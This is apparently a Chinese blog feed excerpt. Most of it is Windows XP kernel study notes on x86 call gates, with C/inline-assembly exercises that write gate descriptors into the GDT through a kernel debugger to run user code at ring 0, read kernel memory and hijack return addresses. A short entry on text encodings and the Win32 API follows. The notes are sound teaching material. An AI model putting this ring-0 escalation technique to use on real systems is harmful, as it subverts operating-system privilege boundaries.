<h2 id="4-调用门（无参）"><a href="#4-调用门（无参）" class="headerlink" title="4 调用门（无参）"></a>4 调用门（无参）</h2><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP（EIP是废弃的）</span><br></pre></td></tr></table></figure>

<p>执行步骤：</p>
<ol>
<li>根据CS的值查GDT表，找到对应的段描述符，这个描述符是一个<strong>调用门</strong>。（S&#x3D;0，Type&#x3D;1100）</li>
<li>在调用门描述符中存储另一个代码段段的选择子。（具体看下图低四字节16到31位）</li>
<li>该选择子指向的段段.Base + 调用门偏移地址 &#x3D; 就是真正要执行的地址。</li>
</ol>
<p>为了能够访问不同特权级的代码段，处理器提供了一个特殊的描述符集合，叫做门描述符。以下是四种门描述符：</p>
<ul>
<li>调用门</li>
<li>陷阱门</li>
<li>中断门</li>
<li>任务门</li>
</ul>
<p>调用门段描述符结构：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/XG2MfN1EWKw965T.png" alt="29调用门描述符.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/17/Wif9KVxZNGjTHuF.png" alt="30.png"></p>
<div class="note default"><p>需要注意的几点：</p>
<ol>
<li>GDT表中四种情况可以跳转：<mark class="label danger">代码段、调用门、TSS任务段、任务门</mark>。</li>
<li><strong>Windows中没有使用调用门</strong>，需要自己去构造调用门。</li>
<li>如果从3环使用调用门，则DPL要为3，如果不为3那么我们将无法访问到门描述符，敲门的资格都没有。</li>
<li>ParamCount是传参用的，为参数个数。</li>
<li>Segenment Selector是段选择子，指向要加载到CS的的段描述符，也就是要执行的段描述符，RPL&#x3D;0x00&#x2F;0x11。</li>
</ol>
</div>

<h3 id="4-1-调用门段权限检查"><a href="#4-1-调用门段权限检查" class="headerlink" title="4.1 调用门段权限检查"></a>4.1 调用门段权限检查</h3><p><img data-src="https://s2.loli.net/2021/12/19/2ptJhca47nNfGOW.png" alt="61.png"></p>
<h3 id="4-2-练习：使用调用门进行调试"><a href="#4-2-练习：使用调用门进行调试" class="headerlink" title="4.2 练习：使用调用门进行调试"></a>4.2 练习：使用调用门进行调试</h3><p>本题要求：写代码实现一个调用门进行提权，并观察在3环和0环下的ESP、CS、SS段寄存器变化，观察3环进到0环时的堆栈。</p>
<p><strong>先使用自己代码的段选择子找到调用门，然后根据调用门去找要调用的段描述符</strong>。</p>
<p>调用门描述符的DPL必须&#x3D;0x11，因为使用VC6做实验，低4字节高16位（段选择子）要指向一个0环的代码段描述符才能完成本实验。</p>
<div class="note warning"><p><strong>要执行的程序入口地址 &#x3D; Call_Gate.Offset ⊕ CS.Base</strong></p>
</div>

<p>步骤：</p>
<ol>
<li><p>构造调用门段描述符，0x00000000&#96;00000000；（是DPL要为3，否则在3环无法访问到门描述符）</p>
<ul>
<li>P&#x3D;1，DPL&#x3D;11，S&#x3D;0，0x1110&#x3D;0xE，0x0000<strong>E</strong>000&#96;00000000；</li>
<li>调用门Type&#x3D;0x1100&#x3D;0xC，0x0000<strong>EC</strong>00&#96;00000000；</li>
<li><strong>构造选择子</strong>：调用门来执行提权，需要根据自身结构中隐含的段选择子去找一个DPL&#x3D;00的CS段描述符，可构造0x0008&#x2F;0x000B，0x0000<strong>EC00</strong>&#96;<strong>0008</strong>0000。剩下还需要构造一个偏移地址让CS去执行。</li>
</ul>
</li>
<li><p>将段描述符写入GDT表中<strong>P&#x3D;0</strong>的上面去，否则可能会卡死或蓝屏。</p>
<p><img data-src="https://s2.loli.net/2021/12/17/1JIQZMYLBr9U56e.png" alt="31.png"></p>
</li>
<li><p>构造偏移地址：</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) GetGdtRegister()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">3</span>	<span class="comment">//此时的断点在0环</span></span><br><span class="line">        retf	<span class="comment">//不能是RET</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">    *(DWORD*)&amp;Buffer[<span class="number">0</span>] = <span class="number">0x12345678</span>; <span class="comment">//eip随便填</span></span><br><span class="line">    *(WORD*)&amp;Buffer[<span class="number">4</span>] = <span class="number">0x004B</span>;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        call fword ptr[Buffer]       <span class="comment">//call cs:eip   </span></span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/U5NMtLzP14dxmJ6.png" alt="31_1.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/17/flkgNpcjvKLdTb5.png" alt="32.png"></p>
<p>要执行的程序入口地址：0x00401020，则调用门段描述符：0x<strong>0040</strong>EC00&#96;0008<strong>1020</strong>。</p>
<p><img data-src="https://s2.loli.net/2021/12/17/KBJyWH7CvX9lhMp.png" alt="33.png"></p>
<p>观察3环下：ESP&#x3D;0x0012FF28，CS&#x3D;0x001B，SS&#x3D;0x0023。</p>
<p><strong>注意</strong>：在XP中继续执行时如果不取消此时设置的断点的话，从0环返回时将会卡死（目前应该在0环调试状态下）。</p>
<p>此时，取消断点，F5执行，观察Windbg。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/S93Yu2fBivCPkKw.png" alt="34.png"></p>
<p>观察0环下：ESP&#x3D;0xAA15ADD0，CS&#x3D;0x0008，SS&#x3D;0x0010。</p>
<div class="note danger"><p><strong>注意：</strong></p>
<ol>
<li>函数<code>GetGdtRegister()</code>虽然是我们在3环写的，但是通过调用门去执行的时候，该函数的执行权限为0环。</li>
<li><strong>提权后，通用寄存器的值不会发生改变</strong>。</li>
<li>我们的代码虽然写的是三环程序的int3，但是由于这里权限已经提升，断点异常已经不再是三环程序处理（内核相比应用层具有优先处理权），应有内核层处理。这里直观的感受就是，0环调试器(windbg)断点了，vc6无法断点。</li>
</ol>
</div>

<h3 id="4-3-练习：在0环读取GDT表数据"><a href="#4-3-练习：在0环读取GDT表数据" class="headerlink" title="4.3 练习：在0环读取GDT表数据"></a>4.3 练习：在0环读取GDT表数据</h3><p>既然已经提权到0环权限，那么我们就可以写只能在驱动开发中才能写的代码。</p>
<p>本题题目：读取gdt表打印、读取高2G内存中的值并打印。(三环权限是不能够读取高2G内存的，属于内核管理）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwH2GValue; <span class="comment">// 存储高2G的数据</span></span><br><span class="line">BYTE GDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,<span class="number">0x8003f00C</span>  <span class="comment">//读取高2G地址,GDT表的数据</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov dwH2GValue,ebx</span><br><span class="line">		sgdt GDT;           <span class="comment">//读取GDTR寄存器（6字节）</span></span><br><span class="line">		</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintRegister</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD GDT_ADDR = *(PDWORD)(&amp;GDT[<span class="number">2</span>]);</span><br><span class="line">	WORD GDT_LIMIT=*(PWORD)(&amp;GDT[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08X %x %x\n&quot;</span>,dwH2GValue,GDT_ADDR,GDT_LIMIT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;	</span><br><span class="line">	PrintRegister();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>F9下断点，获取FunctionHas0CPL()函数的入口地址。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/G8i2QSF6q1ofXMe.png" alt="35.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/eKSO2PUCYoxt7BH.png" alt="36.png"></p>
</li>
<li><p>修改调用门段描述符。0040EC00&#96;00081030</p>
<p><img data-src="https://s2.loli.net/2021/12/18/udfbCTh5l9iELQ4.png" alt="37.png"></p>
</li>
<li><p>将代码中的<code>int 3</code>注释后执行，否则无法正常从0环返回到3环。在XP的VC6中F5执行如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/OXzsq7d4YINPMgQ.png" alt="38.png"></p>
</li>
</ol>
<h2 id="5-调用门（有参数）"><a href="#5-调用门（有参数）" class="headerlink" title="5 调用门（有参数）"></a>5 调用门（有参数）</h2><p>有参数的调用门相比无参的调用门主要有两点变化：</p>
<ul>
<li>调用门段描述符带有参数的个数（如下图1）</li>
<li>从3环堆栈切换到0环的堆栈时参数在栈中的位置（如下图2）。</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/18/vjakIbUDsi75WRh.png" alt="39.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/qSXlo1AbFQKJiLj.png" alt="28.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD x,y,z;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// pushad 和 pushfd 使ESP减小了 0x24 个字节</span></span><br><span class="line">		<span class="comment">// 原ESP+8就是参数1，+C就是参数2，+10就是参数3，详见堆栈图</span></span><br><span class="line">		<span class="comment">// 如果这里还有疑问，可以在windbg的内存窗口中观察</span></span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x8</span>] <span class="comment">// 参数3</span></span><br><span class="line">		mov dword ptr ds:[x],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x4</span>] <span class="comment">// 参数2</span></span><br><span class="line">		mov dword ptr ds:[y],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x24</span>+<span class="number">0x8</span>+<span class="number">0x0</span>] <span class="comment">// 参数1</span></span><br><span class="line">		mov dword ptr ds:[z],eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf <span class="number">0xC</span>	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push <span class="number">0x3</span></span><br><span class="line">		push <span class="number">0x2</span></span><br><span class="line">		push <span class="number">0x1</span></span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x %x %x\n&quot;</span>,x,y,z);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/18/xcimQ29yB6YSz78.png" alt="41.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/1nyxRj93E4HrUdc.png" alt="40_1.png"></p>
<ol>
<li><p>构造调用门有参数的段描述符：0040EC0<strong>3</strong>&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/gWkicQ1hZs47aeu.png" alt="42.png"></p>
</li>
<li><p>回到XP中取消断点，F5执行，此时将会在断点在0环的int 3。观察堆栈和预期一样。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/utrVYAiXkqzfL7K.png" alt="43.png"></p>
<p>需要注释代码中的<code>int 3</code>才可以正常返回，执行结果如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/bVBdHL73DazmkTN.png" alt="44.png"></p>
</li>
</ol>
<h2 id="6-调用门阶段性测试"><a href="#6-调用门阶段性测试" class="headerlink" title="6 调用门阶段性测试"></a>6 调用门阶段性测试</h2><div class="note warning"><p><strong>关于0环的翻墙</strong>：3环的代码通过调用门执行0环权限下的代码后，RETF回来时<strong>通过修改返回地址跳到其他地方</strong>，即称为翻墙。</p>
</div>

<p>题目：</p>
<p>1、构造一个调用门，实现3环读取高2G内存。</p>
<p>2、在第一题的基础上进行修改，实现通过翻墙的方式返回到其他地址。</p>
<p>3、在第一题的基础上进行修改，在门中再建一个门跳转到其他地址。</p>
<p>要求：</p>
<p>代码正常执行不蓝屏。</p>
<h3 id="6-1-CALL-FAR翻墙"><a href="#6-1-CALL-FAR翻墙" class="headerlink" title="6.1 CALL FAR翻墙"></a>6.1 CALL FAR翻墙</h3><p>翻墙即不走原来的RETF，而是修改堆栈中保存的返回地址，跳转到其他地址。</p>
<p>本题以无参函数示例。</p>
<p>步骤：</p>
<ol>
<li>构造2个函数，提权后将第一个函数的返回地址改为第二个函数的入口地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 修改返回地址，跳转到Exit函数执行</span></span><br><span class="line">		mov eax,<span class="number">0x00401050</span></span><br><span class="line">		mov [esp+<span class="number">0x24</span>],eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bye!\n&quot;</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>如下图，第二个函数的入口地址是<code>0x00401050</code>，代码中修改如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/9NlYEd3HsVqTSmZ.png" alt="46.png"></p>
</li>
<li><p>根据第一个函数的入口地址构造调用门段描述符，0040EC00&#96;00081030</p>
<p><img data-src="https://s2.loli.net/2021/12/18/9NEHiy38vFkeAMt.png" alt="45.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/18/FaCpr3liQUGonD6.png" alt="47.png"></p>
</li>
<li><p>执行结果如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/18/hc16UkKdFy4zN59.png" alt="48.png"></p>
</li>
</ol>
<h3 id="6-2-双调用门"><a href="#6-2-双调用门" class="headerlink" title="6.2 双调用门"></a>6.2 双调用门</h3><p>题目：通过调用门提权后，在第一个函数中再使用一个调用门去执行第二个函数。</p>
<p><strong>注意：</strong>这里使用了2个调用门段描述符，第1个调用门段描述符的DPL&#x3D;0x11，<strong>第2个调用门段描述符的DPL&#x3D;0x00</strong>。因为第一个函数去调用第二个函数是在0环权限下，所以第二个调用门的DPL&#x3D;0x00。</p>
<p>步骤：</p>
<ol>
<li><p>构造2个函数，提权后进入第一个函数，在第一个函数中再使用调用门去执行第二个函数。</p>
<p>第一个函数执行成功时，设置bFlag_1&#x3D;1。</p>
<p>第二个函数执行成功时，设置bFlag_2&#x3D;1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line">BYTE bFlag_1 = <span class="number">0</span>;</span><br><span class="line">BYTE bFlag_2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> Gate_1[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	<span class="comment">//CS_1:8003f048 0040EC00`00081030</span></span><br><span class="line"><span class="keyword">char</span> Gate_2[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>,<span class="number">0</span>&#125;;	<span class="comment">//CS_2:P=1,DPL=0x00,S=0,0x1000=8,调用门Type=0x1100=C</span></span><br><span class="line">                                  	<span class="comment">//另一个门的CS的位置8003f090</span></span><br><span class="line">                                  	<span class="comment">//CS_2:8003f090 00408C00`00081060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL_1()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  注意这里的断点在调试时可以用，但是在真正运行时不能</span></span><br><span class="line">		<span class="comment">//写到函数里，不然会导致程序崩溃</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 修改返回地址，跳转到Exit函数执行</span></span><br><span class="line">		<span class="comment">//mov eax,0x401060</span></span><br><span class="line">		<span class="comment">//mov [esp+0x24],eax</span></span><br><span class="line">		test eax,eax</span><br><span class="line">		mov al,<span class="number">0x1</span></span><br><span class="line">		mov bFlag_1,al	<span class="comment">//mov byte ptr ds:[bFlag_1],al</span></span><br><span class="line"></span><br><span class="line">		call fword ptr ds:[Gate_2]</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL_2()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  注意这里的断点在调试时可以用，但是在真正运行时不能</span></span><br><span class="line">		<span class="comment">//写到函数里，不然会导致程序崩溃</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		test eax,eax</span><br><span class="line">		mov al,<span class="number">0x1</span></span><br><span class="line">		mov bFlag_2,al	<span class="comment">//mov byte ptr ds:[bFlag_2],al </span></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line"></span><br><span class="line">		retf	<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr ds:[Gate_1] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\nGate_1:%x,Gate_2:%x\n&quot;</span>,dwHigh2GValue,bFlag_1,bFlag_2);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取两个函数的入口地址准备构造两个调用门的段描述符。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/hzAY17tUIsDqKJd.png" alt="49.png"></p>
</li>
<li><p>构造2个调用门的段描述符，第一个放在一个P&#x3D;0的0x8003F048。第二个放在P&#x3D;0的0x8003F090，如下图。</p>
<p>eq 8003F048 0040EC00&#96;00081030</p>
<p>eq 8003F090 00408C00&#96;00081060（DPL&#x3D;0x00）</p>
<p><img data-src="https://s2.loli.net/2021/12/18/JSiBCfjMYUPTRWz.png" alt="50.png"></p>
</li>
<li><p>回到XP的VC6中F9取消断点后F5执行，结果如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/D4wXRgvOMIfeJ89.png" alt="51.png"></p>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_1_基础知识</title>
    <url>/post/encryption-and-cracking-1-basic/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-文本字符"><a href="#1-文本字符" class="headerlink" title="1 文本字符"></a>1 文本字符</h2><h3 id="1-1-ASCII和Unicode字符集"><a href="#1-1-ASCII和Unicode字符集" class="headerlink" title="1.1 ASCII和Unicode字符集"></a>1.1 ASCII和Unicode字符集</h3><ul>
<li><strong>ASCII</strong>：<mark class="label success">单字节</mark>编码（最高位没有使用，实际上是7位编码标准），编码取值范围为<mark class="label info">00h~7Fh</mark>，包含26个小写字母、26个大写字母、10个数字、33个控制代码及空格，共128个字符。 （不同的计算机厂商对ASCII进行了扩充使其变为8位，取值范围为<code>00h~FFh</code>）</li>
<li><strong>Unicode</strong>：<mark class="label success">双字节</mark>编码，编码取值范围为<mark class="label info">0000h~FFFFh</mark>，使用<code>0~65535</code>无符号（正整数）的整数对每个字符进行编码。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/06/28/u2OMC7nApEyTFrZ.png" alt="1.png"></p>
<h3 id="1-2-字节存储顺序"><a href="#1-2-字节存储顺序" class="headerlink" title="1.2 字节存储顺序"></a>1.2 字节存储顺序</h3><div class="note warning"><p><strong>大端序</strong>：Big-endian，字符高字节存入存储器低地址，低字节存入高地址。</p>
<p><strong>小端序</strong>：Little-endian，字符高字节存入存储器高地址，低字节存入低地址。</p>
</div>

<p>Intel处理器使用<strong>小端序</strong>在内存中将一个字存入相邻的2字节存储器空间中去。</p>
<p>如将<code>pediy</code>存入到内存中，Unicode为：<code>0070 0065 0064 0069 0079</code>：</p>
<p><img data-src="https://i.loli.net/2021/06/28/XEBnQq5kjosMexL.png" alt="2.png"></p>
<p><img data-src="https://i.loli.net/2021/06/28/PhAswXb1RzBaYHy.png" alt="3.png"></p>
<p><img data-src="https://i.loli.net/2021/06/28/HaiO8yfXGVoBZpw.png" alt="4.png"></p>
<div class="note primary"><ul>
<li>一般来说，x86系列CPU都是Little-endian 字节序；</li>
<li>PowerPC 通常是Big-endian字节序。</li>
<li>因为网络协议也都是采用Big-endian方式传输数据的，所以有时也把 Big-endian方式称为网络字节序。</li>
</ul>
</div>



<h2 id="2-Windows操作系统"><a href="#2-Windows操作系统" class="headerlink" title="2 Windows操作系统"></a>2 Windows操作系统</h2><h3 id="2-1-Win32-API函数"><a href="#2-1-Win32-API函数" class="headerlink" title="2.1 Win32 API函数"></a>2.1 Win32 API函数</h3><div class="note info"><ul>
<li>用于16位Windows的API（Windows 1.0~Windows3.1）称作“Win16”；</li>
<li>用于32位Windows的 API（Windows 9x&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;7&#x2F;10）称作“Win32” ；</li>
<li>64位Windows API的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。</li>
</ul>
</div>

<p>API 函数调用在从Win16到Win32的转变中保持兼容，并在数量和功能上不断增强。W indows 1.0只支持不到450个函数调用，现在已有几千个函数了。</p>
<div class="note danger"><p><strong>所有32位Windows都支持Win16 API（以确保与旧的应用程序兼容）和Win32 API（以运行新的应用程序）</strong>。</p>
</div>

<p>非常有趣的是，Windows NT&#x2F;2000&#x2F;XP&#x2F;7与Windows 9x 的工作方式不同。在Windows NT&#x2F;2000&#x2F;XP&#x2F;7中，Win16 函数调用通过一个转换层转换为Win32函数调用，然后被操作系统处理。 在Windows 9x中，该操作正好相反，Win32 函数调用通过转换层转换为Win16函数调用，再由操作系统进行处理。</p>
<p>Windows运转的核心是动态链接。Windows 提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x中，DLL 通常位于<code>\WINDOWS\SYSTEM</code>子目录中。 在Windows NT&#x2F;2000&#x2F;XP&#x2F;7中，DLL通常位于系统安装目录的<code>\SYSTEM</code>和<code>\SYSTEM32</code>子目录中。</p>
